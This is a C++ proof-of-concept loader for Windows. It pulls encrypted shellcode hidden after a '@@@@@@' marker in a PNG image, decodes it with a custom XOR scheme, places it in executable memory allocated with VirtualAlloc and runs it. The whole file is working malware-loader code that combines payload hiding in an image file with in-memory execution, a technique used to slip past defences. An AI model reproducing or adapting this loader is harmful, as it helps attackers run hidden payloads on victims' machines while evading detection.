#include <fstream>
#include <iostream>
#include <vector>
#include <Windows.h>


int main() {
    int i = 0;
    
    //We load the bytes of the image on a vector 
    std::ifstream image("C:\\gaticos\\PoC_load_shellcode.png", std::ios::binary);

    std::vector<char> bytes(
        (std::istreambuf_iterator<char>(image)),
        (std::istreambuf_iterator<char>()));
    image.close();
    
    int byte_start = 0;
    //We iterate the vector searching for the ASCII value 64, that is equivalent to '@'
    for (i = 0; i < bytes.size(); i++) {
        if ((int)bytes[i] == 64) { //If we find a '@', we check if the following bytes match to the separator '@@@@@@' that we used in the python script
            if ((int)bytes[i + 1] == 64 && (int)bytes[i + 2] == 64 && (int)bytes[i + 3] == 64 && (int)bytes[i + 4] == 64 && (int)bytes[i + 5] == 64) {
                std::cout << "I found the Shellcode!" << std::endl;
                byte_start = i + 6; //We save the start possition of the shellcode
                break;
            }
        }

    }

    unsigned char result[7000]; //We create a buffer where we will save the decrypted shellcode
    int h = 0;
    int code_size = bytes.size() - byte_start; //We calculate the size of the shellcode
    for (int v = byte_start; v < bytes.size(); v+=3) { //We iterate the shellcode, with a 3-byte step
        if (h % 2 == 0) { //If the current byte is a even number possition, we xor it  the value that is shifted by one position from the current byte
            result[h] = bytes[v] ^ bytes[v+1];
        }
        else {  //If the current byte is a odd number possition, we xor it with the value that is shifted by two positions from the current byte
            result[h] = bytes[v] ^ bytes[v+2];
        }
        h++;

    }

    //Now that we got the shellcode decrypted on a Buffer, we can load it with our favourite method
    //In this case, a simple VirtualAlloc will allocate the shellcode on memory and we will execute it 
    void* exec = VirtualAlloc(0, sizeof result, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, result, sizeof result);
    ((void(*)())exec)();

    return 0;
}
